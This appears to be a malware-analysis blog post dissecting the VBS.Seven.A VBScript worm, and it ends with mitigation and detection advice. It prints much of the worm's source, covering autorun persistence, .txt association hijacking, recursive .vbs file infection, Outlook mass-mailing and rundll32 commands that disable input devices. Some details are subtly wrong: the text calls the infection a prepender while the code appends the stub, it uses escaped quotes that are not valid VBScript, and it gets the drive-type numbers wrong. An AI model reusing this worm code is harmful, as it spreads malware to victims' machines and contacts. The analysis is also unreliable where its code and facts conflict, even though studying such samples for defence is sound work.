# Dissecting VBS.Seven.A: A VBScript Worm of “Seven Sins” with Multi-Vector Spread 🛠️🔍

## Disclaimer
This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes.

## Introduction
VBS.Seven.A (June 2001) is a Visual Basic Script (VBScript) worm designed for Windows Script Host (WSH). It blends multiple tactics that were common at the time: registry-based persistence, file association hijacking, removable disk recursion and script prepending, and mass mailing via Outlook with a themed social lure. The script also includes date-based “payloads” that attempt to disable input devices or force logoff, plus visual messages.

This sample is instructive because it shows how a small amount of VBScript can manipulate system associations, plant autoruns, and propagate through both email and local file infection. There’s no exploit or packing—the worm relies entirely on permissive defaults and social engineering. By reading the source, we can extract reliable indicators and behavioral patterns that are still useful for detection on legacy systems and in historical labs.

## Overview of the Malware 🐛
VBS.Seven pursues three main objectives: persistence, propagation, and user-facing pranks aligned with specific dates.

- Persistence: On launch, it copies itself into Windows (`Seven.vbs`), System (`Envy.vbs`), and Temp (`Lust.vbs`), then writes autorun values under HKLM Run and RunServices pointing to the System and Temp copies respectively.
- File infection: It performs recursive traversal of fixed and removable drives, seeking `.vbs` files to prepend a small loader that re-launches `Seven.vbs` from the Windows directory. Infected files are marked with the first-line signature `'VBS.Seven.A` to avoid re-infecting.
- File association hijack: On certain dates, it re-binds the .txt file “open” command to run `wscript <Windows>\Seven.vbs` and swaps the `.vbs` icon to the `.txt` icon, while preserving the old settings under backup values. It also drops `COPYRIGHT.txt.vbs` on the Desktop and in Windows that displays an infection notice.
- Email propagation: Uses Outlook automation (MAPI) to send the Windows copy as an attachment to all address book entries with a “seven sins” themed subject/body.
- Date-based actions: Multiple day checks attempt to disable the mouse or keyboard, force logoff, or display messages.

There is no command-and-control (C2). Spread relies on local file handling and Outlook access, and persistence is achieved via autorun keys and file association changes.

## Section 2 – Source Code Analysis 🔬
The script structure revolves around `SEVEN()`, which orchestrates setup and calls the individual components: `First`, `Second`, `Third`, `Disk`, and `Send`.

### Setup and Persistence
```vb
Set org = fso.GetFile(WScript.ScriptFullname)
org.Copy win & "\Seven.vbs"
org.Copy sys & "\Envy.vbs"
org.Copy tmp & "\Lust.vbs"
run  = ("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Envy")
runs = ("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\Lust")
ws.RegWrite run,  sys & "\Envy.vbs"
ws.RegWrite runs, tmp & "\Lust.vbs"
```
- The worm implants three copies under evocative names, then registers them for autorun:
  - HKLM Run → System copy (`Envy.vbs`)
  - HKLM RunServices → Temp copy (`Lust.vbs`)
- Using both keys increases startup coverage across Windows 9x/ME/2000 variants.

### Date-Based Autorun Pranks (First and Second)
```vb
' First()
If Day(Now) = 1 Or Day(Now) = 15 Or Day(Now) = 30 Then
  run2 = ("HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Anger")
  ws.RegWrite run2, "rundll32 mouse,disable"
End If

' Second()
If Day(Now) = 12 Or Day(Now) = 28 Then
  MsgBox "You're tired now" & vbCrLf & "Switch off you're Computer", vbExclamation, "Seven"
  ws.Run "rundll32.exe user.exe,exitwindows"
End If
If Day(Now) = 14 Then
  MsgBox "The keyboard is on strike !", vbInformation, "Seven"
  ws.Run "rundll32 keyboard,disable"
End If
```
- The worm writes an HKCU Run value named “Anger” that attempts to disable the mouse via `rundll32 mouse,disable`. It also attempts to force a (legacy) logoff and “disable keyboard” via `rundll32` calls on specific days. These commands are ineffective on many modern systems but demonstrate intent.

### File Association Hijack and Visual Droppers (Third)
```vb
If Day(Now) = 5 Or Day(Now) = 17 Then
  bur = ws.RegRead("HKEY_USERS\.DEFAULT\...\Shell Folders\Desktop")
  If Not fso.FileExists(win & "\COPYRIGHT.txt.vbs") Then
    txt  = ws.RegRead("HKCR\txtfile\shell\open\command\")
    ws.RegWrite "HKCR\txtfile\shell\open\command\Pride", txt
    ws.RegWrite "HKCR\txtfile\shell\open\command\", "wscript " & win & "\Seven.vbs"
    icot = ws.RegRead("HKCR\txtfile\DefaultIcon\")
    icov = ws.RegRead("HKCR\VBSfile\DefaultIcon\")
    ws.RegWrite "HKCR\VBSfile\DefaultIcon\oldicon", icov
    ws.RegWrite "HKCR\VBSfile\DefaultIcon\", icot
    Set copy = fso.CreateTextFile(bur & "\COPYRIGHT.txt.vbs")
    copy.WriteLine "MsgBox ""You're infected by my new Worm"" + VbCrLf + VbCrLf + ""  By PetiK (c)2001"", vbCritical, ""VBS.Seven.A"""
    copy.Close
    Set copy = fso.CreateTextFile(win & "\COPYRIGHT.txt.vbs")
    copy.WriteLine "MsgBox ..."
    copy.Close
  End If
End If
```
- The association change points the .txt “open” verb to the Windows copy of the worm, effectively turning .txt opens into VBScript execution on affected hosts. It also swaps the `.vbs` icon to match `.txt`, a minor camouflage trick, while backing up previous values (`Pride`, `oldicon`). Visual droppers inform the user they are “infected,” doubling as author tag.

### Removable/Fixed Drive Recursion and VBScript Prepender
```vb
Sub Disk
  Set dr = fso.Drives
  For Each d In dr
    If d.DriveType = 2 Or d.DriveType = 3 Then
      list d.Path & "\"
    End If
  Next
End Sub

Sub list(dossier)
  Set f = fso.GetFolder(dossier)
  For Each f1 In f.SubFolders
    infect f1.Path
    list f1.Path
  Next
End Sub

Sub infect(dossier)
  Set f = fso.GetFolder(dossier)
  For Each f1 In f.Files
    ext = LCase(fso.GetExtensionName(f1.Path))
    If ext = "vbs" Then
      Set cot = fso.OpenTextFile(f1.Path, 1, False)
      If cot.ReadLine <> "'VBS.Seven.A" Then
        cot.Close
        vbsorg = fso.OpenTextFile(f1.Path, 1, False).ReadAll
        Set inf = fso.OpenTextFile(f1.Path, 2, True)
        inf.WriteLine "'VBS.Seven.A"
        inf.Write vbsorg
        inf.WriteLine ""
        inf.WriteLine "Set w=CreateObject(\"WScript.Shell\")"
        inf.WriteLine "Set f=CreateObject(\"Scripting.FileSystemObject\")"
        inf.WriteLine "w.run f.GetSpecialFolder(0)&\"\\Seven.vbs\""
        inf.Close
      End If
    End If
  Next
End Sub
```
- Drives of type 2 (removable) and 3 (fixed) are traversed recursively. For `.vbs` files lacking the marker comment on the first line, the worm prepends a loader stub that, when the infected script executes, immediately launches `Seven.vbs` from the Windows directory. The original contents remain after the stub.

### Outlook Mass Mailing
```vb
Set A = CreateObject("Outlook.Application")
Set B = A.GetNameSpace("MAPI")
For Each C In B.AddressLists
  If C.AddressEntries.Count <> 0 Then
    For D = 1 To C.AddressEntries.Count
      Set E = C.AddressEntries(D)
      Set F = A.CreateItem(0)
      F.To = E.Address
      F.Subject = "What is the seven sins ??"
      F.Body = "Look at this file and learn them."
      Set G = CreateObject("Scripting.FileSystemObject")
      F.Attachments.Add G.BuildPath(G.GetSpecialFolder(0), "Seven.vbs")
      F.DeleteAfterSubmit = True
      If F.To <> "" Then F.Send
    Next
  End If
Next
```
- For each address entry in Outlook, the worm composes and sends an email with the Windows copy attached (`Seven.vbs`). The dual-question-mark subject and moralistic body are classic social lures.

## Section 3 – Mitigation and Defense Strategies 🛡️
- Constrain WSH: Disable or restrict `wscript.exe`/`cscript.exe` for standard users via application control (AppLocker/WDAC). Allow only signed scripts and trusted paths where scripting is required.
- Email client hardening: Enforce prompts or block automation of the Outlook object model. Detect processes sending many emails with identical subjects and script attachments; block `.vbs` attachments at the email gateway.
- Monitor and protect file associations: Baseline and audit `HKCR\txtfile\shell\open\command` and `HKCR\VBSfile\DefaultIcon`. Alert on changes from non-administrative processes or from `wscript.exe` contexts.
- File infection detection: Scan `.vbs` files for the exact marker `'VBS.Seven.A` as the first line, and for prepended stubs that launch `Seven.vbs`. EDR rules can detect mass sequential writes to `.vbs` across removable and fixed drives.
- Autorun keys: Watch for HKLM Run/RunServices values named `Envy` and `Lust` pointing to `Envy.vbs` in System or `Lust.vbs` in Temp. Also check HKCU Run for `Anger` entries.
- Block legacy `rundll32` abuse: Create detections for `rundll32.exe` invoked with unusual targets like `mouse,disable` or `keyboard,disable` and for `user.exe,exitwindows` (legacy logoff).
- Removable media policies: Disable autorun and limit script execution from removable drives. Use device control to restrict write access where possible.
- Least privilege and isolation: Running users without admin rights limits registry writes to HKLM and shell associations. Consider isolating legacy Office/Outlook in hardened sandboxes.

## Conclusion
VBS.Seven.A demonstrates how early 2000s VBScript worms combined multiple vectors—autoruns, file association hijacks, removable drive recursion, and Outlook mass mailing—into a compact script. Its behavior is noisy but deterministic, with clear markers (`'VBS.Seven.A`, HKLM Run/RunServices values “Envy”/“Lust”, `.txt` association rewrites) and distinct social lures. In modern environments, strong scripting controls, hardened email clients, and monitoring for file association changes and removable-drive activity largely neutralize this class of malware. For legacy systems and archival analysis, the indicators and mitigations above provide practical guidance for detection and cleanup.
